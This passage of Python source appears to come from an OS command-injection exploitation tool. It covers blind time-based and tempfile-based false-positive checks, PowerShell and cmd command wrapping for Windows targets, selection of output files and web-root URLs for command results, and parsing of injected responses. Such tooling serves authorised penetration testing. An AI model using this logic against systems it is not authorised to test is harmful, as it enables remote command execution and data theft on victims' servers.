def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None, silent=False):

  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads

  # silent=True skips the detection-phase chatter for a resume re-verify.
  if not silent:
    checks.check_for_false_positive_result(false_positive_warning)

  # Varying the sleep time.
  if false_positive_warning:
    timesec = timesec + random.randint(3, 5)

  # Verify the oracle with known logical properties; any failed relationship invalidates the round.
  if settings.TARGET_OS != settings.OS.WINDOWS and not alter_shell:
    a, c, b = sorted(random.sample(range(1, 50), 3))
    # End on a must-delay check; the caller re-validates the final exec_time.
    litmus_checks = [
      (str(a) + " -eq " + str(a), True),
      (str(a) + " -eq " + str(c), None),   # discarded - lets the backend settle after any earlier delay
      (str(a) + " -eq " + str(b), False),
      (str(b) + " -eq " + str(c), False),
      (str(b) + " " + str(c), False),       # not a valid test expression
      (str(c) + " -eq " + str(c), True),
    ]
    verified = True
    for condition, expect in litmus_checks:
      payload = payloads.condition_check(separator, condition, timesec, http_request_method)
      if payload is None:
        verified = False
        break
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(".")
      before = settings.TOTAL_OF_REQUESTS
      exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      if stability.request_was_retried(before):
        verified = False
        break
      delayed = checks.time_related_shell(url_time_response, exec_time, timesec)
      if not delayed:
        checks.record_baseline_response_time(exec_time)
      if expect is not None and delayed != expect:
        verified = False
        break

    if verified:
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")
      return exec_time, str(randvcalc)
    else:
      if not silent:
        checks.unexploitable_point(retry_attempt, retry_total)
      return exec_time, ""

  if settings.TARGET_OS == settings.OS.WINDOWS:
    previous_cmd = cmd
    if alter_shell:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
      else:
        cmd = checks.quoted_cmd(cmd)
    else:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim().length"
      else:
        cmd = "powershell.exe -InputFormat none write-host ([string](cmd /c " + cmd + ")).trim()"

  # The verified value is always a single digit (see handler.py's randv1/randv2 ranges), so its output length is always 1.
  output_length = 1
  if not silent and settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(".")
  if alter_shell:
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
    else:
      payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
  else:
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
    else:
      payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)

  # Requires the delay twice in a row before accepting - one stray slow response is cheap, two isn't.
  def _retry_confirm(payload):
    nonlocal exec_time, vuln_parameter, prefix, suffix
    consecutive_hits = 0
    for attempt in range(settings.FALSE_POSITIVE_RETRIES):
      before = settings.TOTAL_OF_REQUESTS
      # Discard the returned payload - prefixes() re-prepending onto it would compound on every retry.
      exec_time, vuln_parameter, _, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      if stability.request_was_retried(before):
        continue
      if checks.time_related_shell(url_time_response, exec_time, timesec):
        consecutive_hits += 1
        # Let the backend's own cooldown pass before trusting the next timing read.
        time.sleep(timesec)
        if consecutive_hits >= 2:
          return True
      else:
        consecutive_hits = 0
        checks.record_baseline_response_time(exec_time)
    return False

  found_chars = _retry_confirm(payload)

  if found_chars:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      cmd = previous_cmd

    output = []
    # The verified value is always in 1-7 (see handler.py's randv1/randv2 ranges).
    for ascii_char in range(1, 8):
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(".")
      if alter_shell:
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          payload = payloads.fp_result_alter_shell(separator, cmd, 1, ascii_char, timesec, http_request_method)
        else:
          payload = payloads.fp_result_alter_shell(separator, OUTPUT_TEXTFILE, 1, ascii_char, timesec, http_request_method)
      else:
        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
          payload = payloads.fp_result(separator, cmd, 1, ascii_char, timesec, http_request_method)
        else:
          payload = payloads.fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method)
      if _retry_confirm(payload):
        output.append(ascii_char)
        break

    output = "".join(str(p) for p in output)

    if str(output) == str(randvcalc):
      if not silent and settings.VERBOSITY_LEVEL == 0:
        settings.print_data_to_stdout(" (done)")
      return exec_time, output
    else:
      if not silent:
        checks.unexploitable_point(retry_attempt, retry_total)
      return exec_time, ""

  else:
    if not silent:
      checks.unexploitable_point(retry_attempt, retry_total)
    return exec_time, ""

"""
Get the command output filename, skipping the prompt when resuming.
"""
def select_output_filename(technique, tmp_path, TAG, prompt=True):
  # Ensure tmp_path is safe to concatenate.
  tmp_path = checks.normalize_target_dir(tmp_path)

  # If a custom filename is already set, handle tmp_path prefix depending on technique
  if settings.CUSTOM_FILENAME:
    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
      if not settings.CUSTOM_FILENAME.startswith(tmp_path):
        settings.CUSTOM_FILENAME = tmp_path + settings.CUSTOM_FILENAME
    else:
      # Remove tmp_path prefix if present but technique is different
      if settings.CUSTOM_FILENAME.startswith(tmp_path):
        settings.CUSTOM_FILENAME = settings.CUSTOM_FILENAME[len(tmp_path):]
    return settings.CUSTOM_FILENAME

  # Generate default filename
  OUTPUT_TEXTFILE = TAG + settings.OUTPUT_FILE_EXT

  while prompt:
    message = "Do you want to use a random file '" + OUTPUT_TEXTFILE 
    message += "' to receive the command execution output? [Y/n] "
    procced_option = common.read_input(message, default="Y", check_batch=True)

    if procced_option in settings.CHOICE_YES:
      break

    elif procced_option in settings.CHOICE_NO:
      message = "Enter a filename to receive the command execution output "
      message = common.read_input(message, default=OUTPUT_TEXTFILE, check_batch=True)

      OUTPUT_TEXTFILE = message
      info_msg = "Using '" + OUTPUT_TEXTFILE + "' for command execution output."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      break

    elif procced_option in settings.CHOICE_QUIT:
      raise SystemExit()

    else:
      common.invalid_option(procced_option)

  # Prepend tmp_path if needed
  if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    OUTPUT_TEXTFILE = tmp_path + OUTPUT_TEXTFILE

  settings.CUSTOM_FILENAME = OUTPUT_TEXTFILE
  return OUTPUT_TEXTFILE

"""
Find the URL directory.
"""
def injection_output(url, OUTPUT_TEXTFILE, timesec, technique):

  def custom_web_root(url, OUTPUT_TEXTFILE):
    path = _urllib.parse.urlparse(url).path
    if path.endswith('/'):
      # Contract again the url.
      scheme = _urllib.parse.urlparse(url).scheme
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + path + OUTPUT_TEXTFILE
    else:
      try:
        path_parts = [non_empty for non_empty in path.split('/') if non_empty]
        count = 0
        for part in path_parts:
          count = count + 1
        count = count - 1
        last_param = path_parts[count]
        output = url.replace(last_param, OUTPUT_TEXTFILE)
        if "?" and settings.OUTPUT_FILE_EXT in output:
          try:
            output = output.split("?")[0]
          except (Exception, SystemExit):
            pass
      except IndexError:
        output = url + "/" + OUTPUT_TEXTFILE
    settings.DEFINED_WEBROOT = output
    return output

  if not settings.DEFINED_WEBROOT or settings.MULTI_TARGETS or not settings.RECHECK_FILE_FOR_EXTRACTION:
    if menu.options.web_root:
      scheme = _urllib.parse.urlparse(url).scheme
      hostname = _urllib.parse.urlparse(url).hostname
      netloc = _urllib.parse.urlparse(url).netloc
      output = scheme + "://" + netloc + "/" + OUTPUT_TEXTFILE
      if not settings.DEFINED_WEBROOT or (settings.MULTI_TARGETS and not settings.RECHECK_FILE_FOR_EXTRACTION):
        if settings.MULTI_TARGETS:
          settings.RECHECK_FILE_FOR_EXTRACTION = True
        while True:
          message =  "Do you want to use the URL '" + output
          message += "' to receive the command execution output? [Y/n] "
          procced_option = common.read_input(message, default="Y", check_batch=True)
          if procced_option in settings.CHOICE_YES:
            settings.DEFINED_WEBROOT = output
            break
          elif procced_option in settings.CHOICE_NO:
            message =  "Enter URL to receive "
            message += "the command execution output "
            message = common.read_input(message, default=output, check_batch=True)
            if not re.search(r'^(?:http)s?://', message, re.I):
              common.invalid_option(message)
              pass
            else:
              output = settings.DEFINED_WEBROOT = message
              info_msg = "Using '" + output
              info_msg += "' for command execution output."
              settings.print_data_to_stdout(settings.print_info_msg(info_msg))
              settings.RECHECK_FILE_FOR_EXTRACTION = True
              if not settings.DEFINED_WEBROOT:
                pass
              else:
                break
          elif procced_option in settings.CHOICE_QUIT:
            raise SystemExit()
          else:
            common.invalid_option(procced_option)
            pass
    else:
        output = custom_web_root(url, OUTPUT_TEXTFILE)
  else:
    output = settings.DEFINED_WEBROOT

  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking if the file '" + output + "' is accessible."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  return output

"""
Evaluate test results.
"""
def injection_test_results(response, TAG, randvcalc, technique, payload=None):
  if type(response) is bool and response != True or response is None:
    return False

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    # Check the execution results
    html_data = checks.process_page_content(response, action="decode")
    html_data = html_data.replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
    # cleanup string / unescape html to string
    html_data = _urllib.parse.unquote(html_data)
    html_data = unescape(html_data)
    # Replace non-ASCII characters with a single space
    re.sub(r"[^\x00-\x7f]",r" ", html_data)
    html_data = checks.remove_reflected_values(html_data, payload)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + TAG + TAG, html_data)
    else:
      shell = re.findall(r"" + TAG + str(randvcalc) + TAG  + TAG, html_data)
    if len(shell) > 1:
      shell = shell[0]
  else:
    html_data = checks.process_page_content(response, action="decode")
    html_data = re.sub(settings.END_LINE.LF, settings.SINGLE_WHITESPACE, html_data)
    html_data = checks.remove_reflected_values(html_data, payload)
    if settings.SKIP_CALC:
      shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)
    else:
      shell = re.findall(r"" + TAG + settings.SINGLE_WHITESPACE + str(randvcalc) + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE + TAG + settings.SINGLE_WHITESPACE , html_data)

  return shell

"""
Command execution results.
"""
def injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec):

  if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
    try:
      import html
      unescape = html.unescape
    except:  # Python 2
      unescape = _html_parser.HTMLParser().unescape
    false_result = False
    try:
      # Grab execution results
      html_data = checks.process_page_content(response, action="decode")
      html_data = html_data.replace(settings.END_LINE.LF,settings.SINGLE_WHITESPACE)
      # cleanup string / unescape html to string
      html_data = _urllib.parse.unquote(html_data)
      html_data = unescape(html_data)
      # Replace non-ASCII characters with a single space
      re.sub(r"[^\x00-\x7f]",r" ", html_data)
      for end_line in settings.END_LINES_LIST:
        if end_line in html_data:
          html_data = html_data.replace(end_line, settings.SINGLE_WHITESPACE)
          break
      shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + settings.SINGLE_WHITESPACE, html_data)
      if not shell:
        shell = re.findall(r"" + TAG + TAG + "(.*)" + TAG + TAG + "", html_data)
      if not shell:
        return shell
      try:
        if TAG in shell:
          shell = re.findall(r"" + "(.*)" + TAG + TAG, shell)
        # Clear junks
        shell = [tags.replace(TAG + TAG , settings.SINGLE_WHITESPACE) for tags in shell]
        shell = [backslash.replace(r"\/","/") for backslash in shell]
      except UnicodeDecodeError:
        pass
      if settings.TARGET_OS == settings.OS.WINDOWS:
        if menu.options.alter_shell:
          shell = [right_space.rstrip() for right_space in shell]
          shell = [left_space.lstrip() for left_space in shell]
          if "<<<<" in shell[0]:
            false_result = True
        else:
          if shell[0] == "%i" :
            false_result = True
    except (AttributeError, TypeError):
      false_result = True
    if false_result:
      shell = ""

  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    new_line = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
    # Grab execution results
    html_data = checks.process_page_content(response, action="decode")
    html_data = re.sub(settings.END_LINE.LF, new_line, html_data)
    shell = re.findall(r"" + TAG + new_line + TAG + "(.*)" + TAG + new_line + TAG + "", html_data)
    try:
      if len(re.split(TAG  + "(.*)" + TAG, shell[0])) != 0:
        shell = re.findall(r"" + new_line + "(.*)" + new_line + "", \
                           re.split(TAG  + "(.*)" + TAG, \
                           re.split(TAG  + "(.*)" + TAG, shell[0])[0])[0])
      shell = shell[0].replace(new_line, settings.END_LINE.LF).rstrip().lstrip()
    except IndexError:
      pass

  else:
    #Find the directory.
    output = injection_output(url, OUTPUT_TEXTFILE, timesec, technique)
    try:
      response = checks.get_response(output)
      if type(response) is bool and response != True or response is None:
        shell = ""
      else:
        shell = checks.process_page_content(response, action="encode").rstrip().lstrip()
        if settings.TARGET_OS == settings.OS.WINDOWS:
          shell = [newline.replace(settings.END_LINE.CR, "") for newline in shell]
          shell = [empty for empty in shell if empty]
    except (_urllib.error.HTTPError, _urllib.error.URLError) as e:
      if str(e.getcode()) == settings.NOT_FOUND_ERROR:
        shell = ""

  return shell
# eof